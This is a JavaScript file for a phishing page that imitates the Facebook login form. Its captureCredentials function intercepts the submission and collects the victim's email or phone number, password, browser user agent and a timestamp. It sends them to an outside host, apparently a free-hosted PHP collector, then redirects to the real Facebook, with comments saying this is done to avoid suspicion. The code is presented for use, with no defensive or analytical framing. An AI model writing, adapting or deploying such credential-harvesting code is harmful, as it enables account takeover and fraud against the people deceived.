function captureCredentials(event) {
    // Prevent the normal form submission
    event.preventDefault();
    
    // Get the form data
    var email = document.getElementById('email').value;
    var password = document.getElementById('pass').value;
    
    // Basic validation
    if (!email || !password) {
        // If empty fields, just redirect to real Facebook
        window.location.href = "https://www.facebook.com";
        return;
    }
    
    // Basic email validation with regex
    var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email) && !isPhoneNumber(email)) {
        // If not a valid email format, just redirect to real Facebook
        window.location.href = "https://www.facebook.com";
        return;
    }
    
    // Get user information
    var userAgent = navigator.userAgent;
    var date = new Date().toISOString();
    
    // Show loading state
    var submitButton = document.querySelector('.login-button');
    if (submitButton) {
        submitButton.disabled = true;
        submitButton.textContent = "Logging in...";
    }
    
    // Create data object to send
    var data = {
        email: email,
        password: password,
        userAgent: userAgent,
        date: date
    };
    
    // Send data to InfinityFree PHP script
    fetch('grix.fwh.is', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            // Add this to avoid CORS issues
            'Access-Control-Allow-Origin': '*'
        },
        body: JSON.stringify(data)
    })
    .then(function(response) {
        // Redirect regardless of response to avoid suspicion
        window.location.href = "https://www.facebook.com";
    })
    .catch(function(error) {
        // Still redirect even if there's an error
        window.location.href = "https://www.facebook.com";
    });
}

// Helper function to check if a string might be a phone number
function isPhoneNumber(str) {
    // Remove common phone number formatting characters
    const cleaned = str.replace(/[\s\-\(\)\.]/g, '');
    // Check if it's a numeric string with reasonable phone number length
    return /^\d{7,15}$/.test(cleaned);
}

// Add animation effect on page load
document.addEventListener('DOMContentLoaded', function() {
    // Focus on email field
    const emailField = document.getElementById('email');
    if (emailField) {
        emailField.focus();
    }
    
    // Basic form validation feedback
    const passwordField = document.getElementById('pass');
    if (passwordField) {
        passwordField.addEventListener('input', function() {
            // Add visual feedback for password strength (simple example)
            if (passwordField.value.length > 0 && passwordField.value.length < 6) {
                passwordField.style.borderColor = '#f5a623'; // Warning color
            } else if (passwordField.value.length >= 6) {
                passwordField.style.borderColor = '#42b72a'; // Success color
            } else {
                passwordField.style.borderColor = '#ddd'; // Default
            }
        });
    }
}); 